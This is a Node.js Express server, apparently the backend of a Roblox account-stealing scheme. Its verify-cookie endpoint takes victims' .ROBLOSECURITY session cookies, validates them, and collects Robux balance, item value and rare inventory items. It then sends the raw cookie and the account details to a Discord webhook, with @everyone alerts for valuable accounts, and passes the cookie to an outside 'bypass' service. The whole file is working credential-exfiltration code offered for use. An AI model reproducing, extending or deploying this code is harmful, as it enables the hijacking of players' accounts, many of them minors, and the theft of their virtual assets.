const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// ========== CONFIGURATION ==========
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN';
const BYPASS_API_URL = 'https://rblxbypasser.com/api/bypass';

// Asset IDs based on your research
const ASSET_IDS = {
    KORBLOX_RIGHT_LEG: 139607718,
    KORBLOX_LEFT_LEG: 139607673,
    KORBLOX_RIGHT_ARM: 139607625,
    HEADLESS_HEAD: 134967443,
    HEADLESS_BUNDLE_ID: 201,
    EIGHT_BIT_CROWN: 10159600649,
};

// Emojis
const EMOJIS = {
    success: '✅',
    error: '❌',
    warning: '⚠️',
    robux: '💰',
    rap: '📊',
    crown: '👑',
    skull: '💀',
    ghost: '👻',
    clock: '⏰',
    user: '👤',
    id: '🆔',
    calendar: '📅',
    friends: '👥',
    groups: '👥',
    korblox: '🗡️',
    headless: '🎃',
    eightbit: '🕹️',
    cookie: '🍪',
    verified: '✅',
    unverified: '❌',
    sparkles: '✨',
    arrow: '➡️',
    diamond: '💎',
    fire: '🔥',
    star: '⭐',
    gift: '🎁',
    lock: '🔒',
    unlock: '🔓',
    warning_sign: '⚠️',
    info: 'ℹ️',
    chart: '📈',
    ping: '🔔',
    rare: '💎',
    ultra: '🌟'
};

console.log('========================================');
console.log('🔧 WEBHOOK URL:', WEBHOOK_URL);
console.log('========================================');

// Format number with commas
function formatNumber(num) {
    if (!num && num !== 0) return '0';
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

// Get relative time
function getRelativeTime(dateString) {
    if (!dateString || dateString === 'Unknown') return 'Unknown';
    const date = new Date(dateString);
    const now = new Date();
    const diffTime = Math.abs(now - date);
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    
    if (diffDays < 30) return `${diffDays} days ago`;
    if (diffDays < 365) return `${Math.floor(diffDays / 30)} months ago`;
    return `${Math.floor(diffDays / 365)} years ago`;
}

// Check if should @everyone based on conditions
function shouldMentionEveryone(data) {
    const conditions = [];
    
    if (data.inventory?.hasKorblox) conditions.push('KORBLOX');
    if (data.inventory?.hasHeadless) conditions.push('HEADLESS');
    if (data.inventory?.hasEightBitCrown) conditions.push('8-BIT CROWN');
    if (data.robuxBalance >= 1000) conditions.push(`1000+ ROBUX (${formatNumber(data.robuxBalance)} R$)`);
    if (data.rap >= 1000) conditions.push(`1000+ RAP (${formatNumber(data.rap)} R$)`);
    if (data.summary?.friendCount >= 50000) conditions.push(`50K+ FRIENDS (${formatNumber(data.summary.friendCount)})`);
    
    return {
        shouldMention: conditions.length > 0,
        conditions: conditions,
        count: conditions.length
    };
}

// Get mention priority level
function getMentionPriority(data) {
    let priority = 0;
    let priorityName = '';
    
    if (data.inventory?.hasKorblox && data.inventory?.hasHeadless && data.inventory?.hasEightBitCrown) {
        priority = 5;
        priorityName = 'ULTRA RARE - FULL COLLECTION';
    } else if (data.inventory?.hasKorblox && data.inventory?.hasHeadless) {
        priority = 4;
        priorityName = 'VERY RARE - KORBLOX + HEADLESS';
    } else if (data.inventory?.hasKorblox && data.inventory?.hasEightBitCrown) {
        priority = 4;
        priorityName = 'VERY RARE - KORBLOX + 8-BIT';
    } else if (data.inventory?.hasHeadless && data.inventory?.hasEightBitCrown) {
        priority = 4;
        priorityName = 'VERY RARE - HEADLESS + 8-BIT';
    } else if (data.inventory?.hasKorblox) {
        priority = 3;
        priorityName = 'RARE - KORBLOX OWNER';
    } else if (data.inventory?.hasHeadless) {
        priority = 3;
        priorityName = 'RARE - HEADLESS OWNER';
    } else if (data.inventory?.hasEightBitCrown) {
        priority = 2;
        priorityName = 'RARE - 8-BIT CROWN OWNER';
    } else if (data.robuxBalance >= 100000) {
        priority = 2;
        priorityName = 'RICH - 100K+ ROBUX';
    } else if (data.rap >= 100000) {
        priority = 2;
        priorityName = 'RICH - 100K+ RAP';
    } else if (data.robuxBalance >= 1000 || data.rap >= 1000) {
        priority = 1;
        priorityName = 'NOTABLE - 1K+ VALUE';
    }
    
    return { priority, priorityName };
}

async function verifyCookie(cookie) {
    try {
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        return { valid: true, userId: response.data.id, username: response.data.name };
    } catch (error) {
        return { valid: false, error: 'Invalid or expired cookie' };
    }
}

async function checkAge13Plus(cookie, userId) {
    try {
        const response = await axios.get(`https://www.roblox.com/mobileapi/userinfo`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (response.data && response.data.IsThirteenOrOver !== undefined) {
            return response.data.IsThirteenOrOver;
        }
        
        try {
            const birthdateResponse = await axios.get(`https://users.roblox.com/v1/users/${userId}`, {
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cookie}`,
                    'User-Agent': 'Mozilla/5.0'
                }
            });
            
            const createdDate = new Date(birthdateResponse.data.created);
            const now = new Date();
            const age = (now - createdDate) / (1000 * 60 * 60 * 24 * 365);
            return age >= 13;
        } catch {
            return false;
        }
    } catch (error) {
        console.error('Age check error:', error.message);
        return false;
    }
}

async function fetchRobuxBalance(cookie) {
    try {
        const response = await axios.get('https://economy.roblox.com/v1/users/authenticated/currency', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        return response.data.robux;
    } catch (error) {
        console.error('Robux fetch error:', error.message);
        return 0;
    }
}

async function checkInventoryItems(cookie, userId, assetIds) {
    const results = {
        hasKorblox: false,
        hasHeadless: false,
        hasEightBitCrown: false,
        korbloxParts: []
    };
    
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                if (item.assetId === assetIds.KORBLOX_RIGHT_LEG || 
                    item.assetId === assetIds.KORBLOX_LEFT_LEG || 
                    item.assetId === assetIds.KORBLOX_RIGHT_ARM) {
                    results.korbloxParts.push(item.assetId);
                }
                
                if (item.assetId === assetIds.HEADLESS_HEAD) {
                    results.hasHeadless = true;
                }
                
                if (item.assetId === assetIds.EIGHT_BIT_CROWN) {
                    results.hasEightBitCrown = true;
                }
            }
        }
        
        results.hasKorblox = results.korbloxParts.length === 3;
        
        try {
            const bundleResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/bundles/ownership?bundleIds=${assetIds.HEADLESS_BUNDLE_ID}`, {
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cookie}`,
                    'User-Agent': 'Mozilla/5.0'
                }
            });
            
            if (bundleResponse.data && bundleResponse.data.owns) {
                results.hasHeadless = true;
            }
        } catch {
            try {
                const bundleResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/bundles?limit=100`, {
                    headers: {
                        'Cookie': `.ROBLOSECURITY=${cookie}`,
                        'User-Agent': 'Mozilla/5.0'
                    }
                });
                
                if (bundleResponse.data && bundleResponse.data.data) {
                    for (const bundle of bundleResponse.data.data) {
                        if (bundle.id === assetIds.HEADLESS_BUNDLE_ID) {
                            results.hasHeadless = true;
                        }
                    }
                }
            } catch {
                // Silent fail
            }
        }
        
    } catch (error) {
        console.error('Inventory check error:', error.message);
    }
    
    return results;
}

async function fetchUserSummary(userId) {
    try {
        const [profileResponse, friendsResponse, groupsResponse] = await Promise.all([
            axios.get(`https://users.roblox.com/v1/users/${userId}`).catch(() => ({ data: { displayName: 'Unknown', created: new Date().toISOString(), description: '', isBanned: false } })),
            axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`).catch(() => ({ data: { count: 0 } })),
            axios.get(`https://groups.roblox.com/v2/users/${userId}/groups/roles`).catch(() => ({ data: { data: [] } }))
        ]);
        
        const createdDate = new Date(profileResponse.data.created);
        const now = new Date();
        const daysSinceCreation = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
        
        return {
            displayName: profileResponse.data.displayName,
            createdDate: profileResponse.data.created,
            daysSinceCreation: daysSinceCreation,
            friendCount: friendsResponse.data.count,
            groupCount: groupsResponse.data.data ? groupsResponse.data.data.length : 0,
            description: profileResponse.data.description || '',
            isBanned: profileResponse.data.isBanned || false
        };
    } catch (error) {
        console.error('User summary error:', error.message);
        return {
            displayName: 'Unknown',
            createdDate: 'Unknown',
            daysSinceCreation: 0,
            friendCount: 0,
            groupCount: 0,
            description: '',
            isBanned: false
        };
    }
}

// FIXED: Bypass function that won't crash your API
async function bypassExtensions(cookie) {
    try {
        console.log('Attempting to bypass extensions...');
        const response = await axios.post(BYPASS_API_URL, {
            cookie: cookie,
            type: 'extend'
        }, {
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout: 5000, // 5 second timeout
            validateStatus: function (status) {
                return status < 500; // Accept any status less than 500
            }
        });
        
        // Check if response is HTML (error) or JSON
        if (typeof response.data === 'string' && response.data.includes('<!DOCTYPE html>')) {
            console.log('Bypass service returned HTML (likely down)');
            return { success: false, error: 'Service returned HTML error page', message: 'Bypass service is currently unavailable' };
        }
        
        console.log('Bypass successful:', response.status);
        return { success: true, data: response.data };
    } catch (error) {
        console.error('Bypass error:', error.message);
        // Return a friendly error instead of throwing
        return { 
            success: false, 
            error: error.message,
            message: 'Bypass service unavailable, but verification continues'
        };
    }
}

async function fetchUserRAP(cookie, userId) {
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        let totalRAP = 0;
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                if (item.recentAveragePrice) {
                    totalRAP += item.recentAveragePrice;
                }
            }
        }
        return totalRAP;
    } catch (error) {
        console.error('RAP fetch error:', error.message);
        return 0;
    }
}

// SIMPLIFIED WEBHOOK FUNCTION
async function sendToWebhook(data) {
    console.log('📤 Sending to webhook...');
    
    if (!WEBHOOK_URL || WEBHOOK_URL.includes('YOUR_ID')) {
        console.error('❌ WEBHOOK URL NOT CONFIGURED!');
        return { success: false, error: 'Webhook URL not configured' };
    }
    
    try {
        const mentionCheck = shouldMentionEveryone(data);
        const priority = getMentionPriority(data);
        
        let content = '';
        if (data.success && mentionCheck.shouldMention) {
            content = `@everyone ${EMOJIS.ultra} **RARE ACCOUNT DETECTED!** ${EMOJIS.ultra}\n`;
            content += `**${priority.priorityName}** - ${mentionCheck.count} rare condition(s) met!\n`;
        } else if (data.success) {
            content = `${EMOJIS.success} **Account Verified** ${EMOJIS.success}\n`;
        } else {
            content = `${EMOJIS.warning} **Verification Failed** ${EMOJIS.warning}\n`;
        }
        
        const embed = {
            title: data.success ? "✅ Account Verified" : "❌ Verification Failed",
            color: data.success ? 0x00FF00 : 0xFF0000,
            fields: [
                {
                    name: `${EMOJIS.cookie} Cookie`,
                    value: `\`\`\`${data.cookie || 'No cookie'}\`\`\``,
                    inline: false
                }
            ],
            timestamp: data.timestamp
        };
        
        if (data.success) {
            embed.fields.push(
                {
                    name: `${EMOJIS.user} User`,
                    value: `**Username:** ${data.username}\n**ID:** ${data.userId}`,
                    inline: true
                },
                {
                    name: `${EMOJIS.robux} Value`,
                    value: `**Robux:** ${formatNumber(data.robuxBalance)} R$\n**RAP:** ${formatNumber(data.rap)} R$`,
                    inline: true
                }
            );
            
            if (mentionCheck.shouldMention) {
                embed.fields.push({
                    name: `${EMOJIS.rare} Rare Items`,
                    value: mentionCheck.conditions.join('\n'),
                    inline: false
                });
            }
        }
        
        const webhookData = {
            content: content,
            embeds: [embed],
            allowed_mentions: { parse: ["everyone"] }
        };
        
        await axios.post(WEBHOOK_URL, webhookData);
        console.log('✅ Webhook sent!');
        return { success: true, mentioned: mentionCheck.shouldMention };
        
    } catch (error) {
        console.error('❌ Webhook failed:', error.message);
        return { success: false, error: error.message };
    }
}

// ========== MAIN API ENDPOINT ==========

app.post('/api/verify-cookie', async (req, res) => {
    const { cookie } = req.body;
    
    console.log('========================================');
    console.log('🔍 New verification request');
    console.log('========================================');
    
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }
    
    const responseData = {
        cookie: cookie,
        success: false,
        timestamp: new Date().toISOString()
    };
    
    try {
        // Step 1: Verify cookie
        const verification = await verifyCookie(cookie);
        if (!verification.valid) {
            responseData.error = verification.error;
            await sendToWebhook(responseData);
            return res.status(401).json({ 
                success: false, 
                error: verification.error,
                cookie: cookie 
            });
        }
        
        responseData.success = true;
        responseData.username = verification.username;
        responseData.userId = verification.userId;
        
        // Step 2: Get all user data
        responseData.isThirteenPlus = await checkAge13Plus(cookie, verification.userId);
        responseData.robuxBalance = await fetchRobuxBalance(cookie);
        responseData.rap = await fetchUserRAP(cookie, verification.userId);
        
        const inventoryItems = await checkInventoryItems(cookie, verification.userId, ASSET_IDS);
        responseData.inventory = {
            hasKorblox: inventoryItems.hasKorblox,
            hasHeadless: inventoryItems.hasHeadless,
            hasEightBitCrown: inventoryItems.hasEightBitCrown,
            korbloxPartsOwned: inventoryItems.korbloxParts.length
        };
        
        const userSummary = await fetchUserSummary(verification.userId);
        responseData.summary = userSummary;
        responseData.daysSinceCreation = userSummary.daysSinceCreation;
        
        // Step 3: Try bypass (won't crash if it fails)
        const bypassResult = await bypassExtensions(cookie);
        responseData.bypassResult = bypassResult;
        
        // Step 4: Send to webhook
        const webhookResult = await sendToWebhook(responseData);
        
        // Step 5: Return response
        res.json({
            success: true,
            username: responseData.username,
            userId: responseData.userId,
            robuxBalance: responseData.robuxBalance,
            rap: responseData.rap,
            hasKorblox: responseData.inventory.hasKorblox,
            hasHeadless: responseData.inventory.hasHeadless,
            hasEightBitCrown: responseData.inventory.hasEightBitCrown,
            isThirteenPlus: responseData.isThirteenPlus,
            bypassAttempted: true,
            bypassSuccess: bypassResult.success,
            webhookSent: webhookResult.success,
            mentioned: webhookResult.mentioned,
            cookie: cookie
        });
        
    } catch (error) {
        console.error('Server error:', error);
        responseData.error = error.message;
        await sendToWebhook(responseData);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error', 
            details: error.message,
            cookie: cookie 
        });
    }
});

// Test endpoint
app.post('/api/test-webhook', async (req, res) => {
    const testData = {
        cookie: "TEST_COOKIE",
        success: true,
        username: "TestUser",
        userId: 123456789,
        robuxBalance: 5000,
        rap: 10000,
        isThirteenPlus: true,
        inventory: {
            hasKorblox: true,
            hasHeadless: true,
            hasEightBitCrown: false
        },
        summary: {
            friendCount: 1000,
            groupCount: 5
        },
        timestamp: new Date().toISOString()
    };
    
    const result = await sendToWebhook(testData);
    res.json({ 
        message: "Test completed", 
        webhookSent: result.success,
        mentioned: result.mentioned 
    });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'API is running', 
        timestamp: new Date().toISOString(),
        bypassService: BYPASS_API_URL
    });
});

app.get('/', (req, res) => {
    res.json({ 
        name: 'Roblox Cookie API',
        version: '1.0.0',
        endpoints: [
            'POST /api/verify-cookie',
            'POST /api/test-webhook',
            'GET /health'
        ]
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log('========================================');
    console.log('📡 Test with Postman:');
    console.log(`   POST http://localhost:${PORT}/api/verify-cookie`);
    console.log('   Body: { "cookie": "your_cookie_here" }');
    console.log('========================================');
});

module.exports = app;
